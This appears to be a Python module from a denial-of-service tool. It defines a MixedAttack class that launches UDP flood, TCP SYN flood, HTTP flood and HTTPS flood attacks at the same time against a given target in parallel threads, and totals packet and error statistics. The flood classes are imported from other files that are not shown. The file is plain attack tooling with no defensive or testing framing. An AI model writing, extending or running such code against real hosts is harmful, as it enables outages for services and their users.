"""
Mixed Attack Handler (UDP + TCP + HTTP + HTTPS)
"""

import threading
import time
from udp_flood import UDPFlood
from tcp_syn import TCPSynFlood
from http_flood import HTTPFlood
from https_flood import HTTPSFlood

class MixedAttack:
    def __init__(self):
        self.name = "MIXED ATTACK"
        self.running = False
        self.stats = {
            'packets': 0,
            'errors': 0,
            'threads': 0
        }
        self.attacks = []
        self.threads = []
    
    def start(self, target, threads_config, main_tool):
        """Start mixed attack (all methods simultaneously)"""
        self.running = True
        self.target = target
        
        print(f"\n{self.name} started on {target}")
        print("Launching UDP, TCP, HTTP, and HTTPS attacks simultaneously")
        
        # Create all attack instances
        udp = UDPFlood()
        tcp = TCPSynFlood()
        http = HTTPFlood()
        https = HTTPSFlood()
        
        self.attacks = [udp, tcp, http, https]
        
        # Start each attack in its own thread
        for attack in self.attacks:
            thread = threading.Thread(
                target=attack.start,
                args=(target, threads_config, main_tool)
            )
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
        
        # Aggregate statistics
        while self.running and main_tool.running:
            total_packets = 0
            total_errors = 0
            total_threads = 0
            
            for attack in self.attacks:
                stats = attack.get_stats()
                total_packets += stats['packets']
                total_errors += stats['errors']
                total_threads += stats['threads']
            
            self.stats['packets'] = total_packets
            self.stats['errors'] = total_errors
            self.stats['threads'] = total_threads
            
            time.sleep(1)
    
    def stop(self):
        """Stop mixed attack"""
        self.running = False
        for attack in self.attacks:
            attack.stop()
    
    def get_stats(self):
        """Get current statistics"""
        return self.stats
